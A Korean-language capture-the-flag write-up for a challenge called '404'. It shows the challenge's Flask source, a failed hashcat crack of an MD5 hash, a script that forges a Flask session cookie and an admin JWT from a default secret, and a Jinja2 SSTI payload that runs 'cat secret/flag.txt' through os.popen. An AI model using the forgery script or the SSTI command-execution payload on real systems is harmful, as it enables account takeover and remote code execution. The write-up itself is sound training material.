# QnQsec Write Up

## 1.1 404

ctf write up

## 404

대상 URL로 진입
![img.png](404/img.png)

또 제공되는 app.py를 확인해보자
```jupyter
import os
import sqlite3
import secrets
import hashlib
from hashlib import md5
from datetime import datetime, timedelta, timezone

import jwt
from flask import (
Flask, request, render_template, redirect, session,
flash, url_for, g, abort, make_response
)

from admin_routes import admin_bp,generate_jwt


BASE_DIR = os.path.abspath(os.path.dirname(__file__))
SECRET_DIR = os.path.join(BASE_DIR, 'secret')
FLAG_PATH = os.path.join(SECRET_DIR, 'flag.txt')
FLAG_PREFIX = 'QnQsec'


def ensure_flag():
os.makedirs(SECRET_DIR, exist_ok=True)
if not os.path.exists(FLAG_PATH):
with open(FLAG_PATH, 'w') as f:
f.write(f"{FLAG_PREFIX}{{{secrets.token_hex(16)}}}")


ensure_flag()


app = Flask(__name__)
base = os.environ.get("Q_SECRET", "qnqsec-default")
app.config['SECRET_KEY'] = hashlib.sha1(("pepper:" + base).encode()).hexdigest()


app.config['JWT_SECRET'] = hashlib.sha256(("jwtpepper:" + base).encode()).hexdigest()
app.config['JWT_EXPIRES_MIN'] = 60


app.register_blueprint(admin_bp)


DB_PATH = os.path.join(BASE_DIR, 'users.db')


def get_db():
if 'db' not in g:
g.db = sqlite3.connect(DB_PATH, timeout=10)
g.db.row_factory = sqlite3.Row
return g.db


@app.teardown_appcontext
def close_db(_exc):
db = g.pop('db', None)
if db is not None:
db.close()


def init_db():
with sqlite3.connect(DB_PATH, timeout=10) as db:
db.execute('PRAGMA journal_mode=WAL')
db.execute('drop table if exists users')
db.execute('create table users(username text primary key, password text not null)')

        db.execute('insert into users values("flag", "401b0e20e4ccf7a8df254eac81e269a0")')
        db.commit()


if not os.path.exists(DB_PATH):
init_db()


@app.route('/')
def index():
return redirect(url_for('login'))


@app.route('/sign_up', methods=['GET', 'POST'])
def sign_up():
if request.method == 'GET':
return render_template('sign_up.html')

    username = (request.form.get('username') or '').strip()
    password = request.form.get('password') or ''
    if not username or not password:
        flash('Missing username or password', 'error')
        return render_template('sign_up.html')

    try:
        db = get_db()
        db.execute(
            'insert into users values(lower(?), ?)',
            (username, md5(password.encode()).hexdigest())
        )
        db.commit()
        flash(f'User {username} created', 'message')
        return redirect(url_for('login'))
    except sqlite3.IntegrityError:
        flash('Username is already registered', 'error')
        return render_template('sign_up.html')


@app.route('/login', methods=['GET', 'POST'])
def login():
if request.method == 'GET':
return render_template('login.html')

    username = (request.form.get('username') or '').strip()
    password = request.form.get('password') or ''
    if not username or not password:
        flash('Missing username or password', 'error')
        return render_template('login.html')

    db = get_db()
    row = db.execute(
        'select username, password from users where username = lower(?) and password = ?',
        (username, md5(password.encode()).hexdigest())
    ).fetchone()

    if row:
        session['user'] = username.title()

        
        role = "admin" if username.lower() == "flag" else "user"
        token = generate_jwt(session['user'],role,app.config['JWT_EXPIRES_MIN'],app.config['JWT_SECRET'])

        resp = make_response(redirect(url_for('account')))
        resp.set_cookie("admin_jwt", token, httponly=False, samesite="Lax")
        return resp

    flash('Invalid username or password', 'error')
    return render_template('login.html')


@app.route('/logout')
def logout():
session.pop('user', None)
resp = make_response(redirect(url_for('login')))
resp.delete_cookie("admin_jwt")
return resp


@app.route('/account')
def account():
user = session.get('user')
if not user:
return redirect(url_for('login'))
if user == 'Flag':
return render_template('account.html', user=user, is_admin=True)
return render_template('account.html', user=user, is_admin=False)



if __name__ == '__main__':
app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)
```

시스템은 Flag user를 자동으로 생성하고 MD5을 패스워드가 소스내 노출됨.
레인보우 테이블 공격으로 MD5 복호화 시도

hashcat -m 0 401b0e20e4ccf7a8df254eac81e269a0 /path/to/rockyou.txt

but 복호화 실패

![img_1.png](404/img_1.png)
![img_2.png](404/img_2.png)

대상 내에는 계정 생성프로세스가 존재함. 계정생성 후 admin_jwt 발급 확인
app.py 소스를 다시보면

base = os.environ.get("Q_SECRET", "qnqsec-default")

app.config['SECRET_KEY'] = hashlib.sha1(("pepper:" + base).encode()).hexdigest()
app.config['JWT_SECRET'] = hashlib.sha256(("jwtpepper:" + base).encode()).hexdigest()

으로 base값과 SECRET_KEY와 JWT_SECRET 방법 확인 가능함. 따라서 base값을 알면 서명값 획득이 가능
Flag user로 서명값 생성 시도

```jupyter
# make_tokens_nolib.py
from flask import Flask, session
import hashlib, time, hmac, base64, json

def b64url(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def jwt_encode_hs256(payload: dict, key: str) -> str:
    header = {"alg":"HS256","typ":"JWT"}
    head = b64url(json.dumps(header,separators=(',',':')).encode())
    body = b64url(json.dumps(payload,separators=(',',':')).encode())
    signing_input = f"{head}.{body}".encode()
    sig = hmac.new(key.encode(), signing_input, hashlib.sha256).digest()
    return f"{head}.{body}.{b64url(sig)}"

base = "qnqsec-default"
SECRET_KEY = hashlib.sha1(("pepper:" + base).encode()).hexdigest()
JWT_SECRET = hashlib.sha256(("jwtpepper:" + base).encode()).hexdigest()

app = Flask(__name__)
app.secret_key = SECRET_KEY
with app.test_request_context('/'):
    session.clear()
    session['user'] = "Flag"
    s = app.session_interface.get_signing_serializer(app)
    flask_session_cookie = s.dumps(dict(session))

now = int(time.time())
payload = {"sub":"Flag","role":"admin","iat":now,"exp":now+3600}
jwt_token = jwt_encode_hs256(payload, JWT_SECRET)

print("SESSION_COOKIE="+flask_session_cookie)
print("ADMIN_JWT="+jwt_token)
```

SESSION_COOKIE=eyJ1c2VyIjoiRmxhZyJ9.aPHQcg.MSkYl-Po1_e1rvV4WXQYfBGL47U
ADMIN_JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJGbGFnIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzYwNjc4MDAyLCJleHAiOjE3NjA2ODE2MDJ9.NjChcdrIgcKTa43tjCwe2KyMlF0rVWEEFLQ__B9tC3s

인증값 획득 가능

![img_3.png](404/img_3.png)
cookie 값을 해당값으로 변조 후 /account 접근 시도

![img_4.png](404/img_4.png)
Flag 유저로 접근 성공 !

![img_5.png](404/img_5.png)

admin Panel 접근 시 템플릿 랜더 기능 확인
![img_6.png](404/img_6.png)

노출되는 Werkzerg 서버를 보면 Python Flask 서버라는것을 알수있음(이미 소스를 받아서 확인가능)
Jinja2 Flask 탬플릿 랜더링 유츄가능

SSTI 취약점 확인 시도
![img_8.png](404/img_8.png)

취약점 확인 후 Flag 추출 시도. flag.txt 경로는 app.py 내 존재함
{{ self._TemplateReference__context.cycler.__init__.__globals__['__builtins__']['__import__']('os').popen('cat secret/flag.txt').read() }}

![img_9.png](404/img_9.png)

문제해결!
